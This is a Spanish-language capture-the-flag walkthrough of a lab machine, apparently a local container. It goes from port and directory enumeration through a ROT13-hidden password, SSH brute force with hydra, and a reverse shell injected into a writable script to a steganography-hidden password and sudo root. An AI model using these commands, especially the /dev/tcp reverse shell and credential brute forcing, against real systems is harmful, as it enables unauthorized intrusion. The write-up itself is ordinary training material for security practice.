## Reconocimiento:

Puerto 22 : SSH

Puerto 80 : HTTP

En la web no encuentro mucho, pero  en el código hay un dominio:

```bash
gatekeeperhr.com
```

Lo agrego:

```bash
nano /etc/hosts
172,17.0.2  gatekeeperhr.com
```

Le aplico fuzzing:

```bash
gobuster dir -u http://gatekeeperhr.com/ -w <WORDLIST> -x html,php,txt -t 100 -k -r
```

Encuentro la carpeta llamada /spam. Dentro del código hay algo intersante:

```bash
<!-- Yn pbagenfrñn qr hab qr ybf cnfnagrf rf 'checy3' -->
```

Utilizo ChatGPT para que me lo decifre. Es una linea encriptada en ROT13, resultado:

```bash
La contraseña de uno de los pasantes es 'purpl3'
```

Sabiendo eso y que esta corriendo el servicio SSH pruebo un ataque de fuerza bruta a usuarios:

```bash
hydra -L WORDLIST -p purpl3 ssh://172.17.0.2 -t 64
```

User : Pedro

## Escalada pedro → valentina

En la carpeta /opt hay un archivo interesante:

```bash
la -la /opt
-rwxrw-rw- 1 valentina valentina   30 Feb  9 01:47 log_cleaner.sh
```

Veo que tengo todos los permisos, así que la modifico y le inyecto una shell para recibir conexión como el usuario valentina:

```bash
#!/bin/bash

bash -c "bash -i >& /dev/tcp/172.17.0.1/4444 0>&1"
```

Y me pongo a la escucha:

```bash
nc -lvno 4444
```

## Escalada valentina → root

En la carpeta /home/valentina hay una imagen, para pasarla uso  SCP ya que no hay Python:

```bash
cp ~/profile_picture.jpeg /tmp
cd /tmp
chmod 777 profile_picture.jpeg
```

La traigo con el usuario pedro ya que no conozco la passwd de valentina:

```bash
# Desde el Host
scp pedro@172.17.0.2:/tmp/profile_picture.jpeg .
```

Utilizo steghide para extraerlo el archivo:

```bash
steghide extract -sf profile_picture.jpeg
```

No nos pide contraseña y extraigo el archivo llamado “secret.txt”

```bash
cat secret.txt
# Info:
mag1ck
```

Es la contraseña de valentina.

Con esto listo permisos de sudo:

```bash
sudo -l
(ALL : ALL) PASSWD: ALL, NOPASSWD: /usr/bin/vim
```

Veo que puedo ejecutar cualquier cosa con privilegios root:

```bash
sudo su
```

Listo.
